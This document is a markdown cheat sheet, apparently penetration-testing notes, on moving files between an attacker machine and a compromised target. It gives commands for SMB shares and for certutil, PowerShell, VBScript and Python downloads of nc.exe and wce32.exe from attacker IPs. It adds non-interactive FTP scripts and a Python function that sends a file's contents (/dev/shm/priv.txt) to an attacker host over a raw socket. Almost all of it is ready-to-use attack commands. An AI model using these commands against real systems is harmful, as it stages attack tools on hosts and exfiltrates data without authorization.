# File Transfer

## SMB
* On attacker: `impacket-smbserver -comment potato -debug -smb2support tmp /tmp`
* On target: `net use h: \\10.11.0.35\tmp` then simply navigate to `h:\`

## HTTP
* On attacker: `service apache2 start` (files in `/var/www/html/`)
* On target: `http://10.11.0.35/nc.exe`
* On attacker: `python -m SimpleHTTPServer 8001`
* On target: `http://10.11.0.35:8001/nc.exe`

### HTTP - tricky downloads
```certutil.exe -urlcache -split -f http://10.11.0.35/nc.exe butt.exe```

### HTTP - VBS Download 
```
' cat http_download.vbs | while read line; do echo "echo $line>> dl.vbs"; done
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://10.11.0.35/wce32.exe", False
xHttp.Send
with bStrm
.type = 1 '//binary
.open
.write xHttp.responseBody
.savetofile "wce32.exe", 2 '//overwrite
end with
```

### HTTP - PS1 download (v >= 3)
`iwr "http://10.11.0.221/nc.exe" -outfile "butt.exe"`

### HTTP - PS1 download (v < 3)
```
# echo cd $env:temp; $(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.221/nc.exe','butt.exe') >> dl.ps1
cd $env:temp; $(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.221/nc.exe','butt.exe')
```

### HTTP - py download
```
import urllib
urllib.urlretrieve ("http://10.1.1.246/nc.exe", "nc.exe")
```

## FTP

### Windows - FTP - non-interactive
```
echo open 10.10.10.11 21> ftp.txt
echo USER username>> ftp.txt
echo mypassword>> ftp.txt
echo bin>> ftp.txt
echo GET filename>> ftp.txt
echo bye>> ftp.txt
ftp -v -n -s:ftp.txt
```

## Other
### Python dump to netcat
```
import socket

def dump_file_to_netcat(host, port, content):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))
    s.sendall(content.encode())
    s.shutdown(socket.SHUT_WR)
    while True:
        data = s.recv(4096)
        if not data:
            break
        print(repr(data))
    s.close()
dump_file_to_netcat("10.11.0.50",9999,open("/dev/shm/priv.txt").read())
```

## Encoding files
### Windows - base64
```
certutil.exe -encode inputFileName encodedOutputFileName
certutil.exe -decode encodedInputFileName decodedOutputFileName
```